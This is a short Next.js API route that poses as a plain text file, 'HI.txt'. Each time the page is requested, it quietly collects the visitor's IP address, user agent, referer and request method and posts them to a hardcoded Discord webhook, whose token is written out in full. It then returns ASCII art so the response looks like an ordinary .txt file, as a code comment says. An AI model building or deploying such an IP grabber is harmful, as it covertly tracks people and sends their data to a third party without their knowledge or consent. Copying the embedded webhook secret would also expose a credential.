// pages/api/HI.txt.js  (OR app/api/HI.txt/route.js)

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1436694884185538600/fshf-QIb1PUhJACMGckLf6rhcAFzceImMtwVTCW72_zSXYTgSPZ1PLX98HizDKz9kYFE";

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
  const ua = req.headers['user-agent'] || "unknown";
  const referer = req.headers['referer'] || "direct";
  const method = req.method;

  const log = {
    ip,
    ua,
    referer,
    method,
    time: new Date().toISOString(),
    sast: "2025-11-15 23:57:00 SAST",
    country: "ZA",
    path: "/HI.txt"
  };

  // Send to Discord
  fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "HI.txt Accessed",
        color: 0x00ff00,
        fields: [
          { name: "IP", value: ip, inline: true },
          { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false },
          { name: "Referer", value: referer, inline: true },
          { name: "Method", value: method, inline: true },
          { name: "Time (SAST)", value: "2025-11-15 23:57:00", inline: true },
          { name: "Country", value: "ZA", inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  }).catch(() => {});

  // Return plain text (looks like real .txt)
  res.setHeader('Content-Type', 'text/plain');
  res.send(`
██╗  ██╗██╗
██║  ██║██║
███████║██║
██╔══██║╚═╝
██║  ██║██╗
╚═╝  ╚═╝╚═╝

HI.txt - Public Access Log
Time: 2025-11-15 23:57:00 SAST
Country: ZA

[ACCESS LOGGED]
  `.trim());
}
